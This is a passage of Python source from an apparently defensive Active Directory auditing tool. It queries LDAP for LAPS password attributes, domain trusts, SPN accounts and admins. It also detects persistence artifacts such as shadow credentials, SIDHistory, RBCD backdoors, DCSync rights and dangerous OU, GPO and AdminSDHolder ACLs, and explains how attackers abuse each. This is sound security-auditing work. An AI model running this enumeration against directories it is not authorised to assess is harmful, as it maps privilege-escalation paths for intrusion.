    print(f"  {Fore.CYAN}[*] Enumerating computers (LAPS / OS)...{Style.RESET_ALL}")
    comps = paged_search_all(
        conn,
        domain_dn,
        search_filter="(objectClass=computer)",
        attributes=[
            "sAMAccountName", "operatingSystem", "whenChanged",
            "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime",
            "msLAPS-Password", "msLAPS-PasswordExpirationTime",
        ],
        page_size=500,
    )

    for e in comps:
        attrs = e.get("attributes", {})
        sam = str(first_value(attrs.get("sAMAccountName")) or "?")
        os_ = str(first_value(attrs.get("operatingSystem")) or "Unknown")
        laps_v1 = first_value(attrs.get("ms-Mcs-AdmPwd"))
        laps_v2 = first_value(attrs.get("msLAPS-Password"))
        has_laps = bool(laps_v1 or laps_v2)

        recon["computers_by_os"].setdefault(os_, 0)
        recon["computers_by_os"][os_] += 1

        if has_laps:
            recon["laps_computers"].append({"sam": sam, "os": os_})
        else:
            recon["no_laps_computers"].append({"sam": sam, "os": os_})

    return recon

                                                                                
                    
                                                                                
def get_domain_trusts(conn, domain_dn: str) -> list:
    trusts = []
    try:
        entries = paged_search_all(
            conn, domain_dn,
            search_filter="(objectClass=trustedDomain)",
            attributes=["trustPartner","trustType","trustDirection","trustAttributes",
                        "distinguishedName","securityIdentifier"],
            page_size=200,
        )
        for e in entries:
            attrs = e.get("attributes", {})
            name  = str(first_value(attrs.get("trustPartner")) or "?")
            ttype = int(first_value(attrs.get("trustType"))      or 0)
            tdir  = int(first_value(attrs.get("trustDirection"))  or 0)
            tattr = int(first_value(attrs.get("trustAttributes")) or 0)
            raw_sid = e.get("raw_attributes", {}).get("securityIdentifier", [b""])
            t_sid   = sid_to_str(raw_sid[0]) if raw_sid else ""
            dir_name, dir_desc = TRUST_DIR_MAP.get(tdir, (f"Unknown({tdir})", ""))
            trust_flags = []
            if tattr & TRUST_ATTR_NON_TRANSITIVE:     trust_flags.append("Non-Transitive")
            if tattr & TRUST_ATTR_FOREST_TRANSITIVE:  trust_flags.append("Forest-Transitive")
            if tattr & TRUST_ATTR_QUARANTINED:        trust_flags.append("SID-Filtering (Quarantined)")
            if tattr & TRUST_ATTR_CROSS_ORGANIZATION: trust_flags.append("Cross-Organization")
            if tattr & TRUST_ATTR_WITHIN_FOREST:      trust_flags.append("Within-Forest")
            if tattr & TRUST_ATTR_TREAT_AS_EXTERNAL:  trust_flags.append("Treat-As-External")
            if tattr & TRUST_ATTR_USES_RC4:           trust_flags.append("RC4-Encryption")
            trusts.append({
                "name":          name,
                "sid":           t_sid,
                "type":          TRUST_TYPE_MAP.get(ttype, f"Unknown({ttype})"),
                "direction_raw": tdir,
                "direction":     dir_name,
                "direction_desc": dir_desc,
                "attributes":    tattr,
                "trust_flags":   trust_flags,
                "sid_filtering": bool(tattr & TRUST_ATTR_QUARANTINED),
            })
    except Exception as e:
        print(f"{Fore.RED}[-] Trust enum error: {e}{Style.RESET_ALL}")
    return trusts


def enumerate_trusted_domain_objects(conn, trusted_domain: str) -> dict:
    tdn = ",".join(f"DC={p}" for p in trusted_domain.upper().split("."))
    try:
        users, spn_accounts, admins, computers = [], [], [], []
        conn.search(
            search_base=tdn,
            search_filter="(&(objectClass=user)(!(objectClass=computer)))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName","userAccountControl","servicePrincipalName"],
        )
        for e in conn.entries:
            sam  = str(e["sAMAccountName"].value or "")
            uac  = int(e["userAccountControl"].value or 0)
            spns = [str(s) for s in (e["servicePrincipalName"].values or [])]
            users.append({"sam": sam, "disabled": bool(uac & UAC_DISABLED)})
            if spns:
                spn_accounts.append({"sam": sam, "spns": spns})
        conn.search(
            search_base=tdn, search_filter="(sAMAccountName=Domain Admins)",
            search_scope=SUBTREE, attributes=["member"],
        )
        if conn.entries:
            for m in (conn.entries[0]["member"].values or []):
                admins.append(str(m).split(",")[0].replace("CN=",""))
        conn.search(
            search_base=tdn, search_filter="(objectClass=computer)",
            search_scope=SUBTREE,
            attributes=["sAMAccountName","operatingSystem"],
        )
        computers = [
            {"name": str(e["sAMAccountName"].value or ""),
             "os":   str(e["operatingSystem"].value or "")}
            for e in conn.entries
        ]
        return {"accessible": True, "users": users, "spn_accounts": spn_accounts,
                "admins": admins, "computers": computers}
    except Exception as ex:
        return {"accessible": False, "error": str(ex),
                "users": [], "spn_accounts": [], "admins": [], "computers": []}


                                                                                
                                                               
                                                                                
def run_needle_scan(conn, domain_dn: str, page_size: int = 500) -> dict:
    
    findings = {
                              
        "sidhistory_accounts":         [],
        "same_domain_sidhistory":      [],
        "shadow_creds_set":            [],
        "rbcd_preconfigured":          [],
                               
        "unusual_primary_group":       [],        
        "scriptpath_set":              [],        
        "alt_sec_ids_set":             [],        
        "userparams_suspicious":       [],        
                         
        "dcsync_outside_da":           [],
        "domain_root_writedacl":       [],                                            
        "ou_dangerous_acls":           [],
        "gpo_dangerous_acls":          [],
        "ou_inh_disabled":             [],                                          
        "adminsdholder_dangerous_aces":[],                                            
                   
        "domain_root_owner":           {"owner_sid":"","owner_name":"","is_suspicious":False,"finding":""},
        "adminsdholder_owner":         {"owner_sid":"","owner_name":"","is_suspicious":False,"finding":""},
        "ou_nonstandard_owners":       [],
        "gpo_nonstandard_owners":      [],
                    
        "delegation_users":            [],
        "kerberoastable_da":           [],                                       
                              
        "orphaned_admin_count":        [],
        "pre_win2000_members":         [],
        "passwd_notreqd_enabled":      [],
        "asrep_priv_accounts":         [],                                              
        "machine_account_quota":       {"quota": -1, "finding": ""},       
        "dns_admins_members":          [],        
        "unexpected_schema_ea":        {"schema_admins": [], "enterprise_admins": []},
                                     
        "adcs_esc1":                   [],                                       
        "adcs_esc2":                   [],                                  
        "adcs_esc3":                   [],                                    
        "adcs_esc4":                   [],                                   
        "adcs_esc6":                   [],                                          
        "adcs_esc7":                   [],                                            
        "adcs_esc8":                   [],                                                
                       
        "info_field_passwords":        [],                                                
        "write_scriptpath_aces":       [],                                               
        "privileged_group_acls":       [],                                          
        "krbtgt_password_age":         {"days": -1, "severity": "INFO", "finding": ""},
        "cleartext_password_storage":  [],                                   
        "da_not_protected_users":      [],                                       
        "container_dangerous_acls":    [],                                              
        "windows_laps_acl":            [],                                           
        "userparams_suspicious":       [],                                         
    }

    domain_sid = _get_domain_sid_prefix(conn, domain_dn)

    priv_sids = set()
    if domain_sid:
        for rid in (500, 512, 516, 517, 518, 519, 520, 521):
            priv_sids.add(f"{domain_sid}-{rid}")
    priv_sids.update({"S-1-5-18", "S-1-5-32-544", "S-1-5-9"})

                                                                     
    known_priv_members: set[str] = set()
    for grp_name in ("Domain Admins", "Enterprise Admins", "Schema Admins",
                     "Administrators", "Account Operators", "Backup Operators",
                     "Server Operators", "Print Operators",
                     "Group Policy Creator Owners", "DnsAdmins", "Protected Users"):
        try:
            conn.search(
                search_base=domain_dn,
                search_filter=f"(sAMAccountName={grp_name})",
                search_scope=SUBTREE,
                attributes=["member"],
            )
            if conn.entries:
                for mdn in (conn.entries[0]["member"].values or []):
                    cn = str(mdn).split(",")[0].replace("CN=","").replace("cn=","")
                    known_priv_members.add(cn.lower())
        except Exception:
            pass

    sd_ctrl = security_descriptor_control(sdflags=0x04)
    now_utc = datetime.now(tz=timezone.utc)

                                                                             
                                   
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning for SIDHistory...{Style.RESET_ALL}")
    sidh_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(sIDHistory=*)",
        attributes=["sAMAccountName","objectClass","sIDHistory",
                    "userAccountControl","whenChanged","whenCreated"],
        page_size=page_size,
    )
    for e in sidh_entries:
        attrs   = e.get("attributes", {})
        sam     = str(first_value(attrs.get("sAMAccountName")) or "?")
        classes = listify(attrs.get("objectClass"))
        uac     = int(first_value(attrs.get("userAccountControl")) or 0)
        changed = attrs.get("whenChanged")
        sid_history_raw = e.get("raw_attributes", {}).get("sIDHistory", [])
        sid_list = [sid_to_str(s) for s in sid_history_raw if sid_to_str(s)]
        if not sid_list:
            continue
        is_user     = "user"     in [c.lower() for c in classes]
        is_computer = "computer" in [c.lower() for c in classes]
        is_disabled = bool(uac & UAC_DISABLED)
        same_domain = [s for s in sid_list if domain_sid and s.startswith(domain_sid + "-")]
                                       
        sid_names = []
        for s in sid_list[:5]:
            name = resolve_sid_to_name(conn, domain_dn, s)
            rid  = s.split("-")[-1] if "-" in s else ""
                                                               
            is_priv = rid in ("512","519","518","500","544")
            sid_names.append({"sid": s, "name": name, "is_privileged_rid": is_priv})
        has_priv_sid = any(x["is_privileged_rid"] for x in sid_names)
        record = {
            "sam":            sam,
            "dn":             e.get("dn", ""),
            "type":           "Computer" if is_computer else ("User" if is_user else "Other"),
            "disabled":       is_disabled,
            "sid_history":    sid_names,
            "same_domain":    same_domain,
            "has_priv_sid":   has_priv_sid,
            "when_changed":   str(first_value(changed) or ""),
            "severity":       "CRITICAL" if (same_domain or has_priv_sid) else "HIGH",
            "finding": (
                f"[CRITICAL] '{sam}' has same-domain SIDHistory — indicates active SIDHistory "
                "injection attack or post-exploitation artifact."
                if same_domain else
                (f"[CRITICAL] '{sam}' has SIDHistory pointing to a privileged RID "
                 f"({', '.join(x['name'] for x in sid_names if x['is_privileged_rid'])}). "
                 "This account effectively has those group memberships in Kerberos PAC."
                 if has_priv_sid else
                 f"'{sam}' has cross-domain SIDHistory. Verify this is a legitimate migration artifact.")
            ),
        }
        findings["sidhistory_accounts"].append(record)
        if same_domain:
            findings["same_domain_sidhistory"].append(record)

                                                                             
                                                     
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning for Shadow Credentials...{Style.RESET_ALL}")
    kc_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(msDS-KeyCredentialLink=*)",
        attributes=["sAMAccountName","objectClass","msDS-KeyCredentialLink",
                    "userAccountControl","dNSHostName","whenChanged"],
        page_size=page_size,
    )
    for e in kc_entries:
        attrs    = e.get("attributes", {})
        sam      = str(first_value(attrs.get("sAMAccountName")) or "?")
        classes  = listify(attrs.get("objectClass"))
        uac      = int(first_value(attrs.get("userAccountControl")) or 0)
        dns      = str(first_value(attrs.get("dNSHostName")) or "")
        cred_val = listify(attrs.get("msDS-KeyCredentialLink"))
        changed  = attrs.get("whenChanged")
        when_str = str(first_value(changed) or "")
        is_computer  = "computer" in [c.lower() for c in classes]
        cred_count   = len(cred_val)
                                                              
                              
                                                                                  
                                                                   
                                                             
                          
                                                                              
        if is_computer:
            if cred_count <= 1:
                continue                                                            
                                                         
            whfb_pattern = any(
                str(cv).startswith("B:838:") or str(cv).startswith("B:640:")
                for cv in cred_val
            )
            if whfb_pattern and cred_count <= 2:
                continue                                             
            is_suspicious = cred_count > 2
        else:
            is_suspicious = True                           
        findings["shadow_creds_set"].append({
            "sam":              sam,
            "dn":               e.get("dn", ""),
            "type":             "Computer" if is_computer else "User",
            "disabled":         bool(uac & UAC_DISABLED),
            "dns":              dns,
            "credential_count": cred_count,
            "when_changed":     when_str,
            "is_suspicious":    is_suspicious,
            "severity":         "HIGH" if is_suspicious else "INFO",
            "finding": (
                f"[HIGH] '{sam}' (User) has msDS-KeyCredentialLink set ({cred_count} entry/entries). "
                "This is the PKINIT shadow credential attack artifact — an attacker with "
                "ShadowCredentials write access injected a key credential for takeover."
                if not is_computer else
                (f"[HIGH] '{sam}' (Computer) has {cred_count} msDS-KeyCredentialLink entries — "
                 "unusually many, investigate for shadow credential injection."
                 if is_suspicious else
                 f"'{sam}' (Computer) has msDS-KeyCredentialLink (likely WHfB / Azure AD join — verify).")
            ),
        })

                                                                             
                             
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning for pre-configured RBCD...{Style.RESET_ALL}")
    rbcd_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
        attributes=["sAMAccountName","objectClass","dNSHostName",
                    "msDS-AllowedToActOnBehalfOfOtherIdentity","whenChanged"],
        page_size=page_size,
    )
    for e in rbcd_entries:
        attrs    = e.get("attributes", {})
        sam      = str(first_value(attrs.get("sAMAccountName")) or "?")
        classes  = listify(attrs.get("objectClass"))
        dns      = str(first_value(attrs.get("dNSHostName")) or "")
        changed  = attrs.get("whenChanged")
        is_comp  = "computer" in [c.lower() for c in classes]
        raw_rbcd = e.get("raw_attributes", {}).get(
            "msDS-AllowedToActOnBehalfOfOtherIdentity", [])
        allowed_sids, allowed_names = [], []
        if raw_rbcd:
            try:
                rbcd_aces = parse_aces(raw_rbcd[0])
                for ace in rbcd_aces:
                    if ace["type"] in (0x00, 0x05) and ace["trustee"]:
                        allowed_sids.append(ace["trustee"])
            except Exception:
                pass
        allowed_names = [resolve_sid_to_name(conn, domain_dn, s) for s in allowed_sids[:10]]
                                                                                   
        suspicious_principals = [n for n in allowed_names
                                  if not n.endswith("$") and n not in ("SYSTEM","Everyone")]
        findings["rbcd_preconfigured"].append({
            "sam":                  sam,
            "dn":                   e.get("dn", ""),
            "type":                 "Computer" if is_comp else "Other",
            "dns":                  dns,
            "allowed_sids":         allowed_sids,
            "allowed_names":        allowed_names,
            "suspicious_principals": suspicious_principals,
            "when_changed":         str(first_value(changed) or ""),
            "severity":             "CRITICAL" if suspicious_principals else "HIGH",
            "finding": (
                f"msDS-AllowedToActOnBehalfOfOtherIdentity is set on '{sam}'. "
                f"Allowed principals: {', '.join(allowed_names[:5])}. "
                + (f"[CRITICAL] Non-machine principals found ({', '.join(suspicious_principals[:3])}) "
                   "— this is almost certainly a RBCD backdoor, not a legitimate delegation config."
                   if suspicious_principals else
                   "Verify these machine accounts are legitimate service orchestration principals.")
            ),
        })

                                                                             
                               
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking unusual primaryGroupID values...{Style.RESET_ALL}")
    pgid_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer)))",
        attributes=["sAMAccountName","primaryGroupID","userAccountControl",
                    "memberOf","distinguishedName","adminCount"],
        page_size=page_size,
    )
    NORMAL_USER_PGRIDS  = {PRIMARY_GROUP_DOMAIN_USERS}       
    NORMAL_COMP_PGRIDS  = {PRIMARY_GROUP_COMPUTERS, PRIMARY_GROUP_DCS, PRIMARY_GROUP_READONLY_DCS}
    for e in pgid_entries:
        attrs   = e.get("attributes", {})
        sam     = str(first_value(attrs.get("sAMAccountName")) or "?")
        pgid    = int(first_value(attrs.get("primaryGroupID")) or 0)
        uac     = int(first_value(attrs.get("userAccountControl")) or 0)
        adm     = int(first_value(attrs.get("adminCount")) or 0)
        if pgid in NORMAL_USER_PGRIDS:
            continue             
        if pgid == 0:
            continue
                            
        if pgid in (PRIMARY_GROUP_DOMAIN_ADMINS, PRIMARY_GROUP_ENTERPRISE_ADMINS,
                    PRIMARY_GROUP_SCHEMA_ADMINS):
            sev = "CRITICAL"
            group_name = {512:"Domain Admins", 519:"Enterprise Admins",
                          518:"Schema Admins"}.get(pgid, f"RID-{pgid}")
            finding_text = (
                f"[CRITICAL] '{sam}' has primaryGroupID={pgid} ({group_name}). "
                "This account's Kerberos PAC includes this group — it effectively has "
                f"{group_name} membership in all Kerberos-authenticated sessions "
                "WITHOUT appearing in the group's member attribute. "
                "This is the SetPrimaryGroup attack outcome."
            )
        else:
            sev = "HIGH"
            finding_text = (
                f"'{sam}' has unusual primaryGroupID={pgid} (expected 513=Domain Users). "
                "Verify this is intentional — non-standard primary groups are embedded in "
                "the Kerberos PAC and affect resource access silently."
            )
        findings["unusual_primary_group"].append({
            "sam":              sam,
            "dn":               e.get("dn", ""),
            "primary_group_id": pgid,
            "admin_count":      adm,
            "disabled":         bool(uac & UAC_DISABLED),
            "severity":         sev,
            "finding":          finding_text,
        })

                                                                             
                                                 
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking scriptPath/loginScript on accounts...{Style.RESET_ALL}")
    sp_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer))"
                      "(|(scriptPath=*)(loginScript=*)))",
        attributes=["sAMAccountName","scriptPath","loginScript",
                    "userAccountControl","adminCount","memberOf","whenChanged"],
        page_size=page_size,
    )
    for e in sp_entries:
        attrs   = e.get("attributes", {})
        sam     = str(first_value(attrs.get("sAMAccountName")) or "?")
        sp      = str(first_value(attrs.get("scriptPath")) or "")
        ls      = str(first_value(attrs.get("loginScript")) or "")
        uac     = int(first_value(attrs.get("userAccountControl")) or 0)
        adm     = int(first_value(attrs.get("adminCount")) or 0)
        changed = str(first_value(attrs.get("whenChanged")) or "")
        script  = sp.strip() or ls.strip()
                                                                       
        if not script:
            continue
                                                                   
                                                                      
        if _is_legit_netlogon_script(script, domain_dn):
            continue
        is_unc  = script.startswith("\\\\")
        groups  = [str(g).split(",")[0].replace("CN=","")
                   for g in listify(attrs.get("memberOf"))[:3]]
        is_privileged = adm == 1 or any("admin" in g.lower() for g in groups)
        sev = "CRITICAL" if (is_privileged and is_unc) else              "HIGH"     if (is_unc or is_privileged) else "MEDIUM"
        findings["scriptpath_set"].append({
            "sam":         sam,
            "dn":          e.get("dn", ""),
            "script_path": script,
            "is_unc":      is_unc,
            "is_privileged": is_privileged,
            "admin_count": adm,
            "when_changed": changed,
            "disabled":    bool(uac & UAC_DISABLED),
            "severity":    sev,
            "finding": (
                f"[{sev}] '{sam}' has scriptPath set to non-standard path: '{script}'. "
                + ("UNC path pointing to non-standard share — if attacker-controlled, "
                   "code executes in the target's context on next interactive logon."
                   if is_unc else
                   "Logon script pointing to non-standard location — verify script content.")
                + (" Account has adminCount=1 (privileged) — execution context = elevated."
                   if is_privileged else "")
            ),
        })

                                                                             
                                                                        
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking altSecurityIdentities...{Style.RESET_ALL}")
    altsec_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(objectClass=user)(altSecurityIdentities=*))",
        attributes=["sAMAccountName","altSecurityIdentities",
                    "userAccountControl","adminCount","whenChanged"],
        page_size=page_size,
    )
    for e in altsec_entries:
        attrs   = e.get("attributes", {})
        sam     = str(first_value(attrs.get("sAMAccountName")) or "?")
        altsec  = listify(attrs.get("altSecurityIdentities"))
        uac     = int(first_value(attrs.get("userAccountControl")) or 0)
        adm     = int(first_value(attrs.get("adminCount")) or 0)
        changed = str(first_value(attrs.get("whenChanged")) or "")
        sev = "CRITICAL" if adm == 1 else "HIGH"
        findings["alt_sec_ids_set"].append({
            "sam":            sam,
            "dn":             e.get("dn", ""),
            "alt_sec_ids":    [str(a) for a in altsec[:10]],
            "admin_count":    adm,
            "when_changed":   changed,
            "disabled":       bool(uac & UAC_DISABLED),
            "severity":       sev,
            "finding": (
                f"[{sev}] '{sam}' has altSecurityIdentities set. "
                "This maps a certificate or Kerberos principal to this account — "
                "an attacker who controls the mapped certificate can authenticate AS this account "
                "without knowing its password (PKINIT). "
                + ("Account is PRIVILEGED (adminCount=1) — critical backdoor vector."
                   if adm == 1 else "")
            ),
        })

                                                                             
                                        
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking DCSync + WriteDacl/WriteOwner on domain NC root...{Style.RESET_ALL}")
    DCSYNC_GUIDS = {
        "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",                              
        "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",                                  
        "89e95b76-444d-4c62-991a-0facbeda640c",                                              
    }
    try:
        conn.search(
            search_base=domain_dn,
            search_filter="(objectClass=domain)",
            search_scope=BASE,
            attributes=["nTSecurityDescriptor","distinguishedName"],
            controls=sd_ctrl,
        )
        if conn.entries:
            raw_sd_list = conn.entries[0]["nTSecurityDescriptor"].raw_values
            if raw_sd_list:
                domain_root_sd = raw_sd_list[0]
                owner_sid  = parse_sd_owner(domain_root_sd)
                owner_name = resolve_sid_to_name(conn, domain_dn, owner_sid) if owner_sid else "?"
                is_owner_suspicious = (
                    owner_sid not in priv_sids
                    and not (domain_sid and owner_sid.endswith("-512"))
                    and owner_sid not in ("S-1-5-18","S-1-5-32-544","","S-1-5-9")
                )
                findings["domain_root_owner"] = {
                    "owner_sid":     owner_sid,
                    "owner_name":    owner_name,
                    "is_suspicious": is_owner_suspicious,
                    "finding": (
                        f"[CRITICAL] Domain NC root is owned by '{owner_name}' ({owner_sid}). "
                        "Non-standard owner can silently modify the domain object DACL."
                        if is_owner_suspicious else
                        f"Domain NC root owner is '{owner_name}' — expected."
                    ),
                }
                domain_aces = parse_aces(domain_root_sd)
                for ace in domain_aces:
                    if ace["type"] not in (0x00, 0x05):
                        continue
                    trustee = ace["trustee"]
                    is_legit = (
                        trustee in priv_sids
                        or (domain_sid and trustee.startswith(domain_sid + "-") and
                            trustee.split("-")[-1] in ("512","516","519","518","9","500"))
                        or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9","S-1-5-11")
                    )
                    if is_legit:
                        continue
                    trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
                                         
                    guid = (ace["guid"] or "").lower()
                    if guid in DCSYNC_GUIDS:
                        right_name = EXTENDED_RIGHT_GUIDS.get(guid, guid)
                        findings["dcsync_outside_da"].append({
                            "trustee_sid":  trustee,
                            "trustee_name": trustee_name,
                            "right":        right_name,
                            "inherited":    ace["inherited"],
                            "severity":     "CRITICAL",
                            "finding": (
                                f"[CRITICAL] '{trustee_name}' holds {right_name} on domain NC root. "
                                "This principal is NOT a DC/Domain Admin — non-standard DCSync right."
                            ),
                        })
                                                                  
                    if ace["access_mask"] & 0x00040000:             
                        findings["domain_root_writedacl"].append({
                            "trustee_sid":  trustee,
                            "trustee_name": trustee_name,
                            "right":        "WriteDacl",
                            "inherited":    ace["inherited"],
                            "severity":     "CRITICAL",
                            "finding": (
                                f"[CRITICAL] '{trustee_name}' has WriteDacl on the domain NC root. "
                                "This allows granting themselves DCSync or any other domain-level right."
                            ),
                        })
                    if ace["access_mask"] & 0x00080000:              
                        findings["domain_root_writedacl"].append({
                            "trustee_sid":  trustee,
                            "trustee_name": trustee_name,
                            "right":        "WriteOwner",
                            "inherited":    ace["inherited"],
                            "severity":     "CRITICAL",
                            "finding": (
                                f"[CRITICAL] '{trustee_name}' has WriteOwner on the domain NC root. "
                                "Owner can modify DACL — path to full domain control."
                            ),
                        })
    except Exception:
        pass

                                                                             
                                     
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning OU ACLs + inheritance flags...{Style.RESET_ALL}")
    ou_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(objectClass=organizationalUnit)",
        attributes=["nTSecurityDescriptor","distinguishedName","name",
                    "systemFlags","sDRightsEffective"],
        page_size=page_size,
        extra_controls=sd_ctrl,
    )
    for ou_e in ou_entries:
        raw_sd_list = ou_e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
        if not raw_sd_list:
            continue
        ou_dn = ou_e.get("dn", "")
        ou_sd = raw_sd_list[0]
                                                                                
        try:
            sd_control = struct.unpack_from("<H", ou_sd, 2)[0] if len(ou_sd) >= 4 else 0
            if sd_control & 0x1000:                     
                findings["ou_inh_disabled"].append({
                    "dn": ou_dn,
                    "finding": (
                        f"OU '{ou_dn}' has DACL inheritance DISABLED (SE_DACL_PROTECTED). "
                        "This creates a hidden attack surface: dangerous inherited ACEs from "
                        "parent OUs are blocked, but direct ACEs may go unreviewed."
                    ),
                })
        except Exception:
            pass
                     
        ou_owner_sid  = parse_sd_owner(ou_sd)
        ou_owner_name = resolve_sid_to_name(conn, domain_dn, ou_owner_sid) if ou_owner_sid else "?"
        ou_is_suspicious_owner = (
            ou_owner_sid not in priv_sids
            and not (domain_sid and ou_owner_sid.endswith("-512"))
            and ou_owner_sid not in ("S-1-5-18","S-1-5-32-544","","S-1-5-9")
        )
        if ou_is_suspicious_owner:
            findings["ou_nonstandard_owners"].append({
                "dn":         ou_dn,
                "owner_sid":  ou_owner_sid,
                "owner_name": ou_owner_name,
                "finding": (
                    f"OU '{ou_dn}' is owned by '{ou_owner_name}'. "
                    "The owner controls the DACL and can grant rights over ALL child objects."
                ),
            })
                    
        ou_aces = parse_aces(ou_sd)
        for ace in ou_aces:
            if ace["type"] not in (0x00, 0x05):
                continue
            if ace["inherited"]:
                continue                                               
            rights = check_rights(ace["access_mask"], ace["guid"], include_all=False)
            if not rights:
                continue
            trustee = ace["trustee"]
            is_legit = (
                trustee in priv_sids
                or (domain_sid and trustee.startswith(domain_sid + "-") and
                    trustee.split("-")[-1] in ("512","516","519","518","520","521","500"))
                or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9")
            )
            if is_legit:
                continue
            trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
            for right in rights:
                sev = SEVERITY.get(right, "LOW")
                if sev not in ("CRITICAL", "HIGH", "MEDIUM"):
                    continue
                findings["ou_dangerous_acls"].append({
                    "ou_dn":        ou_dn,
                    "trustee_sid":  trustee,
                    "trustee_name": trustee_name,
                    "right":        right,
                    "severity":     sev,
                    "inherited":    False,
                    "finding": (
                        f"'{trustee_name}' has {right} on OU '{ou_dn}' (explicit, non-inherited). "
                        "This grants control over ALL objects in this OU — users, computers, nested OUs."
                    ),
                })

                                                                             
                                      
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Scanning GPO Container ACLs...{Style.RESET_ALL}")
    gpo_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(objectClass=groupPolicyContainer)",
        attributes=["nTSecurityDescriptor","distinguishedName","displayName","gPCFileSysPath"],
        page_size=page_size,
        extra_controls=sd_ctrl,
    )
    for gpo_e in gpo_entries:
        raw_sd_list = gpo_e.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
        if not raw_sd_list:
            continue
        gpo_dn   = gpo_e.get("dn", "")
        gpo_sd   = raw_sd_list[0]
        attrs    = gpo_e.get("attributes", {})
        gpo_name = str(first_value(attrs.get("displayName")) or gpo_dn)
        gpo_path = str(first_value(attrs.get("gPCFileSysPath")) or "")
        gpo_owner_sid  = parse_sd_owner(gpo_sd)
        gpo_owner_name = resolve_sid_to_name(conn, domain_dn, gpo_owner_sid) if gpo_owner_sid else "?"
        gpo_is_suspicious_owner = (
            gpo_owner_sid not in priv_sids
            and not (domain_sid and gpo_owner_sid.endswith("-512"))
            and gpo_owner_sid not in ("S-1-5-18","S-1-5-32-544","","S-1-5-9")
        )
        if gpo_is_suspicious_owner:
            findings["gpo_nonstandard_owners"].append({
                "dn":         gpo_dn,
                "gpo_name":   gpo_name,
                "owner_sid":  gpo_owner_sid,
                "owner_name": gpo_owner_name,
                "finding": (
                    f"GPO '{gpo_name}' is owned by '{gpo_owner_name}'. "
                    "GPO owner can modify contents and apply arbitrary policy to all objects in scope."
                ),
            })
        gpo_aces = parse_aces(gpo_sd)
        for ace in gpo_aces:
            if ace["type"] not in (0x00, 0x05):
                continue
            rights = check_rights(ace["access_mask"], ace["guid"], include_all=False)
            if not rights:
                continue
            trustee = ace["trustee"]
            is_legit = (
                trustee in priv_sids
                or (domain_sid and trustee.startswith(domain_sid + "-") and
                    trustee.split("-")[-1] in ("512","516","519","518","520","521","500"))
                or trustee in ("S-1-5-18","S-1-5-32-544","S-1-5-9","S-1-5-11")
            )
            if is_legit:
                continue
            trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
            for right in rights:
                sev = SEVERITY.get(right, "LOW")
                if sev not in ("CRITICAL","HIGH","MEDIUM"):
                    continue
                findings["gpo_dangerous_acls"].append({
                    "gpo_dn":       gpo_dn,
                    "gpo_name":     gpo_name,
                    "gpo_path":     gpo_path,
                    "trustee_sid":  trustee,
                    "trustee_name": trustee_name,
                    "right":        right,
                    "severity":     sev,
                    "inherited":    ace["inherited"],
                    "finding": (
                        f"'{trustee_name}' has {right} on GPO '{gpo_name}'. "
                        "Controlling a GPO = controlling every computer and user it applies to."
                    ),
                })

                                                                             
                                               
                                                                             
    print(f"  {Fore.CYAN}[*] Needle: Checking AdminSDHolder owner + ACEs...{Style.RESET_ALL}")
    sdh_dn = f"CN=AdminSDHolder,CN=System,{domain_dn}"
    try:
        conn.search(
            search_base=sdh_dn, search_filter="(objectClass=*)", search_scope=BASE,
            attributes=["nTSecurityDescriptor"], controls=sd_ctrl,
        )
        if conn.entries:
            raw = conn.entries[0]["nTSecurityDescriptor"].raw_values
            if raw:
                sdh_sd         = raw[0]
                sdh_owner_sid  = parse_sd_owner(sdh_sd)
                sdh_owner_name = resolve_sid_to_name(conn, domain_dn, sdh_owner_sid) if sdh_owner_sid else "?"
                is_susp = (
                    sdh_owner_sid not in priv_sids
                    and not (domain_sid and sdh_owner_sid.endswith("-512"))
                    and sdh_owner_sid not in ("S-1-5-18","S-1-5-32-544","","S-1-5-9")
                )
                findings["adminsdholder_owner"] = {
                    "owner_sid":     sdh_owner_sid,
                    "owner_name":    sdh_owner_name,
                    "is_suspicious": is_susp,
                    "finding": (
                        f"[CRITICAL] AdminSDHolder is owned by '{sdh_owner_name}' ({sdh_owner_sid}). "
                        "Non-standard owner can modify the DACL that SDProp copies to ALL "
                        "privileged accounts every 60 minutes — persistent hidden backdoor."
                        if is_susp else
                        f"AdminSDHolder owner is '{sdh_owner_name}' — expected."
                    ),
                }
                                                    
                builtin = {"S-1-5-18","S-1-5-9","S-1-5-10",
                           "S-1-5-32-544","S-1-5-32-548","S-1-5-32-549",
                           "S-1-5-32-550","S-1-5-32-551","S-1-5-32-552"}
                for ace in parse_aces(sdh_sd):
                    trustee = ace["trustee"]
                    if trustee in builtin or trustee in priv_sids:
                        continue
                    if domain_sid and trustee.startswith(domain_sid + "-") and                       trustee.split("-")[-1] in ("512","516","519","518","500"):
                        continue
                    if ace["type"] not in (0x00, 0x05):
                        continue
                    rights = check_rights(ace["access_mask"], ace["guid"])
                    if not rights:
                        continue
                    trustee_name = resolve_sid_to_name(conn, domain_dn, trustee)
                    for right in rights:
